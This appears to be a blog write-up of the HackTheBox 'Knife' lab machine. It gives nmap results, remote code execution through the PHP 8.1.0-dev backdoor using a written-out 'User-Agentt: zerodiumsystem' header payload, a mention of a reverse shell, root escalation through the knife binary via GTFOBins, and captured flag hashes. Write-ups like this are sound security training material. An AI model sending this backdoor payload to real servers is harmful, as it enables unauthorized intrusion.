---
layout: /src/layouts/MarkdownPostLayout_HTB.astro
title: Knife HackTheBox Write-Up
author: Adrian Reategui
description: ""
image:
  url: "/images/posts/knife_bg.png"
  alt: ""
pubDate: 2025-06-14
tags:
  ["linux", "PHP-8.1.0-dev"]
languages: []
---

### SUMMARY
> This machine has port 22 and port 80 open, when inspecting the webpage on port 80 I couldnt find anything however there was a php version a bit interesting which was **PHP-8.1.0-dev**. When investigating this version of PHP had a backdoor and was vulnerable to RCE trough the use of a custom header in the GET request. Knowing this I was able to obtian a shell to the system as the user James, once inside the victim machine the user James had the privilege to execute the knife command as the user root, this binary allows to obtain a shell as the user root.
### NMAP
- Nmap scan results
	```
	# Nmap 7.95 scan initiated Tue Apr 29 09:48:30 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80 -oN targeted 10.10.10.242
	Nmap scan report for 10.10.10.242
	Host is up (0.27s latency).
	
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
	|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
	|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title:  Emergent Medical Idea
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	# Nmap done at Tue Apr 29 09:48:53 2025 -- 1 IP address (1 host up) scanned in 23.19 seconds
	```
### FOOTHOLD
- When using whatweb against the webpage it reported us an unusual PHP version
	![alt](/images/posts/knife.webp)
- When investigating about the PHP version I found it was vulnerable to RCE trough the user of a custom header in the request. Read more [HERE](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
	![alt](/images/posts/knife2.webp)
- Knowing this I decided to send a request using the custom header and I obtained RCE on the victim machine
	```
		User-Agentt": "zerodiumsystem('cmd');
	```
	![alt](/images/posts/knife3.webp)
- I then send a revershell to my kali machine successfully
	![alt](/images/posts/knife4.webp)
### LOCAL
- Once inside the machine I retrieve the user's flag
	```
	james@knife:~$ whoami ; ifconfig ; cat /home/james/user.txt
	james
	ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
	        inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255
	        inet6 dead:beef::250:56ff:fe94:d0b9  prefixlen 64  scopeid 0x0<global>
	        inet6 fe80::250:56ff:fe94:d0b9  prefixlen 64  scopeid 0x20<link>
	        ether 00:50:56:94:d0:b9  txqueuelen 1000  (Ethernet)
	        RX packets 270403  bytes 28377783 (28.3 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 289943  bytes 45178683 (45.1 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
	        inet 127.0.0.1  netmask 255.0.0.0
	        inet6 ::1  prefixlen 128  scopeid 0x10<host>
	        loop  txqueuelen 1000  (Local Loopback)
	        RX packets 345468  bytes 38279556 (38.2 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 345468  bytes 38279556 (38.2 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	037b2897e8de7db6b74e9917f4edbfd9
	```
### PRIVILEGE ESCALATION
- Enumerating the system I found the user James had the privilege to execute the knife binary on the victim machine
	![alt](/images/posts/knife5.webp)
- Investigating on gtfobins I found this binary can be bypassed to escape the restricted environment obtaining a shell as root
	![alt](/images/posts/knife6.webp)
- I then decided to escape the restrictions obtaining a shell as the user root
	![alt](/images/posts/knife7.webp)
### ROOT
- I retrieved root's user flag
	```
	# whoami ; ifconfig ; cat /root/root.txt
	root
	ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
	        inet 10.10.10.242  netmask 255.255.255.0  broadcast 10.10.10.255
	        inet6 dead:beef::250:56ff:fe94:d0b9  prefixlen 64  scopeid 0x0<global>
	        inet6 fe80::250:56ff:fe94:d0b9  prefixlen 64  scopeid 0x20<link>
	        ether 00:50:56:94:d0:b9  txqueuelen 1000  (Ethernet)
	        RX packets 270346  bytes 28373723 (28.3 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 289887  bytes 45173728 (45.1 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
	        inet 127.0.0.1  netmask 255.0.0.0
	        inet6 ::1  prefixlen 128  scopeid 0x10<host>
	        loop  txqueuelen 1000  (Local Loopback)
	        RX packets 344917  bytes 38230753 (38.2 MB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 344917  bytes 38230753 (38.2 MB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
	
	6531043c0a489af29cc49d45f83e3d9b
	```

